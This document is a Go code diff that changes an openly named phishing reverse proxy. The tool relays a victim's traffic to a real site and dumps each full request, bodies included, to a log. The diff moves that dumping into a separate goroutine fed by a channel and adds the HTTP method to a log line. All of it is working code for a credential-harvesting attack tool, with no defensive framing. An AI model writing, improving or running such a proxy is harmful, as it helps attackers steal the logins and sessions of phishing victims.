@@ -39,7 +39,7 @@ func (p *PhishingProxy) rewriteHeaders(request *http.Request) {
 	request.RequestURI = ""
 }
 
-func (p *PhishingProxy) HandleConnection(conn net.Conn) {
+func (p *PhishingProxy) HandleConnection(conn net.Conn, requests chan<- *http.Request) {
 	defer conn.Close()
 	reader := bufio.NewReader(conn)
 	request, err := http.ReadRequest(reader)
@@ -49,20 +49,15 @@ func (p *PhishingProxy) HandleConnection(conn net.Conn) {
 	}
 
 	p.rewriteHeaders(request)
-	r, err := httputil.DumpRequest(request, true)
-	if err != nil {
-		log.Println("Error dumping request to console.")
-		return
-	}
+	requests <- request
 
-	log.Println(string(r))
 	resp, err := p.client.Do(request)
 	if err != nil {
 		log.Println("Proxy error:", err.Error())
 		return
 	}
 
-	log.Println(request.URL, "-", resp.Status)
+	log.Println(request.Method, request.URL, "-", resp.Status)
 	modifiedResponse, err := httputil.DumpResponse(resp, true)
 	if err != nil {
 		log.Println("Error converting requests to bytes:", err.Error())
@@ -73,6 +68,17 @@ func (p *PhishingProxy) HandleConnection(conn net.Conn) {
 	if err != nil {
 		log.Println("Error responding to victim:", err.Error())
 		return
+	}
+}
+
+func processRequests(requests <-chan *http.Request) {
+	for request := range requests {
+		r, err := httputil.DumpRequest(request, true)
+		if err != nil {
+			log.Println("Error dumping request to console.")
+			return
+		}
+		log.Println(string(r))
 	}
 }
 
@@ -116,11 +122,13 @@ func main() {
 		}()
 	}
 
+	requests := make(chan *http.Request)
+	go processRequests(requests)
 	for {
 		conn, err := server.Accept()
 		if err != nil {
 			log.Println("Error when accepting request,", err.Error())
 		}
-		go phishingProxy.HandleConnection(conn)
+		go phishingProxy.HandleConnection(conn, requests)
 	}
 }
